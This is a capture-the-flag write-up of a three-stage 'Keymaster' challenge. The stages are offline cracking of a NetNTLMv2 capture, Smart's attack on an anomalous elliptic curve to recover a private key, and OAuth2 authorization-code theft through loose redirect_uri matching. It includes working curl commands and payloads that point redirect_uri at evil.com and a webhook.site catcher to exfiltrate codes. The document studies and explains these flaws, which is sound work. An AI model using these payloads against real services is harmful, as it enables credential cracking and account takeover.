> **Solved and written by** Hrishikesh (`hrishikesh`) · **Team** Cyfer Trace · **Submitted** Oct. 23, 2026, 12:19 p.m.
>
> **Official challenge:** Keymaster CRW2 · **Category:** Networking · **Difficulty:** Expert · **Points:** 700 · **Solves:** 146
>
> This writeup was contributed by the named teammate for the Cyfer Trace archive. It is not personal work by Ishant Choudhary. Light formatting and file links were added here; the technical content is the author's.

---

# Keymaster — Writeup

**Category:** Networking (Network → Crypto → Web chain)
**Flag:** `ctf7{ntlmv2_smart_curve_oauth_redirect}`

## Challenge summary

Three services, three stages, each stage's output feeds the next stage's key:

| Stage | Service | Port | Vulnerability |
|---|---|---|---|
| 1 | File-share pcap | 16220 | NetNTLMv2 crackable offline against a small wordlist |
| 2 | Key-attestation service | 16221 | Anomalous elliptic curve (`n == p`) → Smart's attack |
| 3 | OAuth2 SSO server | 16222 | Loose substring `redirect_uri` validation → authorization code theft |

---

## Stage 1 — Network: NTLM capture → credential

`GET /` on `http://2.31.70.16:16220/` listed two files:

```
capture.pcap
wordlist.txt   (40 candidate passwords)
```

Loading the pcap with Scapy showed 9 packets, all plain HTTP (not SMB) — an NTLM-over-HTTP handshake against `km-dc01.keymaster.local`:

```
GET /archive/report.docx HTTP/1.1          (no auth)
401 Unauthorized, WWW-Authenticate: NTLM
GET ... Authorization: NTLM <Type-1 Negotiate>
401, WWW-Authenticate: NTLM <Type-2 Challenge>
GET ... Authorization: NTLM <Type-3 Authenticate>
200 OK
```

Decoded the Type-2 (challenge) and Type-3 (authenticate) NTLMSSP messages manually (base64 → struct-unpack fields):

- **Domain:** `KEYMASTER`
- **User:** `k.archivist`
- **Workstation:** `KM-WRK07`
- **Server challenge:** from Type-2
- **NTProofStr + blob:** first 16 bytes / remainder of the NTLMv2 response in Type-3

Assembled the hashcat/John NetNTLMv2 line:

```
k.archivist::KEYMASTER:<server_challenge>:<NTProofStr>:<blob>
```

No `hashcat`/`john` binaries were available in the environment, so cracking was done with a small from-scratch Python implementation:

```
NTOWFv2 = HMAC-MD5( MD4(UTF16LE(password)), UTF16LE(upper(user) + domain) )
NTProofStr = HMAC-MD5( NTOWFv2, server_challenge + blob )
```

(MD4 isn't always available via `hashlib`, so a pure-Python MD4 fallback was included.) Brute-forcing the 40-word list against the expected `NTProofStr` found a match:

```
PASSWORD FOUND: Meridian$55
```

**Stage 1 result:** `k.archivist` / `Meridian$55` (domain `KEYMASTER`)

---

## Stage 2 — Crypto: anomalous curve → Smart's attack

`GET /` on `http://2.31.70.16:16221/` described a `/attest` endpoint needing the archivist credential:

```
POST /attest  {"username":"k.archivist","password":"Meridian$55"}
```

Response gave elliptic curve domain parameters and a public key:

```json
{
  "curve": "anomalous-weierstrass",
  "p": "0x13307b4e7cf4f1b675fc2c54a5932302d12661d3d",
  "a": "0x6df03c80998c6a3a635b96e93a0f989cb9a546c7",
  "b": "0x115faa0f045e7ae6bd76992cd0cd685dbdd5ced58",
  "G": ["0x4", "0xfae79ea1992e44de304242d51be440a7efab8007"],
  "n": "0x13307b4e7cf4f1b675fc2c54a5932302d12661d3d",
  "Q": ["0x6c31a96c879a75f37bbbdc136d8e692e32040bdb",
        "0xee37446df3c8632a3d64e586dde57eb7047a294a"],
  "note": "Q = d*G. d is the attestation private key (and the Stage-3 OAuth client secret)."
}
```

Here `n == p`: the curve's group order equals the field prime — a textbook **anomalous curve**, vulnerable to **Smart's attack (SSSA, 1999)**. Any ECDLP on it collapses to an easy computation via the formal group of the curve lifted to `Z_p`.

### Implementation (no Sage/PARI available)

Standard writeups of Smart's attack rely on Sage's native `Qp` (p-adic numbers) field. Without Sage, this had to be reimplemented from scratch:

1. **Hensel-lift** `G` and `Q`'s y-coordinates from `F_p` up to higher p-adic precision using Newton's method (quadratic convergence per iteration).
2. Implement a minimal **p-adic number class**: a value is stored as `(valuation, unit)` meaning `value = unit * p^valuation`, with `unit` tracked modulo `p^PREC` for a generous relative precision (`PREC = 12`). This correctly handles division by non-units (elements with positive p-adic valuation) by shifting the valuation — something plain `mod p^2` integer arithmetic cannot do, since `pow(x, -1, m)` fails outright when `gcd(x, m) != 1`.
3. Implement elliptic-curve point addition/doubling over this p-adic number type (standard affine chord-and-tangent formulas, but using the p-adic divide instead of raw modular inverse).
   - **Key subtlety found while debugging:** during the double-and-add computation of `p*G`, two differently-lifted representations of points can have the *same* `F_p` reduction but differ at higher precision. Naively comparing raw integers (instead of their reduction mod `p`) to decide "same point → use tangent formula" vs "different points → use chord formula" causes the addition formula to pick the wrong branch and divide by a non-unit, crashing. The fix: always branch on equality **mod `p`**, not on raw integer/mod-`p²` equality.
   - A second subtlety: for `p*G`, the exact point where the chord formula tries to add `P` and `-P` happens precisely at the **final bit** of the double-and-add chain (since the partial sum of all lower bits plus the top bit exactly equals `p`). This is not a bug to special-case away — it is exactly the point near `O` whose p-adic coordinates encode the formal-group logarithm we need, so it must be computed with full p-adic precision rather than approximated as the literal point at infinity.
4. Compute `R_G = p * G_lift` and `R_Q = p * Q_lift` over the p-adic curve. Since `G` has order `p` in `F_p`, these reduce to `O` mod `p`, i.e. they land in the kernel of reduction — the formal group, which is isomorphic to `p·Z_p / p²·Z_p` via the logarithm map:

   ```
   log(P) = -x(P) / y(P)   (mod p^2)
   ```

5. Because `log` is a group homomorphism on the kernel and `Q = d·G`, we get `log(R_Q) = d · log(R_G) (mod p)`, so:

   ```
   d = log(R_Q) * log(R_G)^(-1)  (mod p)
   ```

Running this recovered:

```
d = 0x75a058f10510d8318e535596f17c758707cbb291
```

Verified independently by computing `d*G` with a plain `F_p` scalar multiplication and confirming it equals the given `Q` — **match confirmed**.

**Stage 2 result:** private key `d = 0x75a058f10510d8318e535596f17c758707cbb291`
(per the service's own note, this doubles as the Stage 3 OAuth2 confidential-client secret)

---

## Stage 3 — Web: OAuth2 redirect_uri substring bypass

`GET /` on `http://2.31.70.16:16222/` described an OAuth2 authorization server:

```json
{
  "client_id": "keymaster-console",
  "endpoints": ["/authorize", "/token", "/admin/flag"],
  "registered_redirect_uri": "http://console.keymaster.local/callback",
  "note": "confidential client; /authorize delivers the code to the callback, /token exchanges it, /admin/flag needs an admin access token"
}
```

### Probing the redirect_uri check

`/authorize` doesn't return the authorization code directly — it performs the code delivery itself (simulating "the admin's browser following the redirect") and only reports `delivered: true/false`.

Testing showed the validation is a **loose substring match**, not an exact/prefix check:

```bash
# registered string appended as a path suffix -> accepted
redirect_uri=http://console.keymaster.local/callback.evil.com   → 200 OK

# registered string embedded anywhere in an arbitrary URL -> accepted
redirect_uri=http://evil.com/http://console.keymaster.local/callback → 200 OK

# no occurrence of the registered string at all -> rejected
redirect_uri=http://evil.com/callback → 400 invalid_redirect_uri
```

So the server almost certainly does something like `registered_redirect_uri in redirect_uri` instead of exact matching or allow-list validation of the authority component.

### Exploiting it

Crafted a `redirect_uri` whose **actual host** is an attacker-controlled endpoint, while the registered callback string is tucked into the query string so the substring check still passes:

```
https://webhook.site/<token>?x=http://console.keymaster.local/callback
```

```bash
curl -s -i -G "http://2.31.70.16:16222/authorize" \
  --data-urlencode "client_id=keymaster-console" \
  --data-urlencode "response_type=code" \
  --data-urlencode "redirect_uri=https://webhook.site/<token>?x=http://console.keymaster.local/callback"
```

Response: `"delivered": true` — the server made an outbound GET to our webhook.site endpoint, carrying the authorization code as a query parameter:

```json
{
  "query": {
    "x": "http://console.keymaster.local/callback",
    "code": "IZCI2ZbjVEkCKYdZDebVZGO_CKErngeN",
    "state": ""
  },
  "ip": "2.31.70.16"
}
```

(Note: catching the server's outbound delivery requires an endpoint reachable by both the attacker and the remote challenge host — a public catcher such as webhook.site/requestbin/Burp Collaborator is the standard technique.)

### Redeeming the code

Exchanged the stolen code at `/token`, using the Stage-2 recovered private key as the confidential-client secret:

```bash
curl -s -i -X POST "http://2.31.70.16:16222/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=IZCI2ZbjVEkCKYdZDebVZGO_CKErngeN" \
  --data-urlencode "client_id=keymaster-console" \
  --data-urlencode "client_secret=0x75a058f10510d8318e535596f17c758707cbb291" \
  --data-urlencode "redirect_uri=https://webhook.site/<token>?x=http://console.keymaster.local/callback"
```

```json
{
  "access_token": "-Dnfu4C4x7kv46PFv4yjVpjy8n0H8vSnPZ4q8OHb8ss",
  "expires_in": 3600,
  "scope": "admin",
  "token_type": "Bearer"
}
```

### Flag

```bash
curl -s -i "http://2.31.70.16:16222/admin/flag" \
  -H "Authorization: Bearer -Dnfu4C4x7kv46PFv4yjVpjy8n0H8vSnPZ4q8OHb8ss"
```

```json
{"flag":"ctf7{ntlmv2_smart_curve_oauth_redirect}"}
```

---

## Flag

```
ctf7{ntlmv2_smart_curve_oauth_redirect}
```

## Key takeaways

- **NetNTLMv2** is a challenge/response, not a cleartext credential — but it's still crackable offline with a wordlist, because the hash is effectively `HMAC-MD5` keyed on the NT hash of the password.
- An **anomalous elliptic curve** (`#E(F_p) == p`) is catastrophic: Smart's attack solves the ECDLP in polynomial time via the curve's formal group, with no need for brute force. "Weak/unusual curve parameters" in a crypto challenge is a strong signal to check `n` vs `p`.
- **OAuth2 `redirect_uri` validation must be exact-match against an allow-list**, never substring/prefix/contains logic — any looseness turns the authorization endpoint into an open redirect that leaks authorization codes to attacker infrastructure.
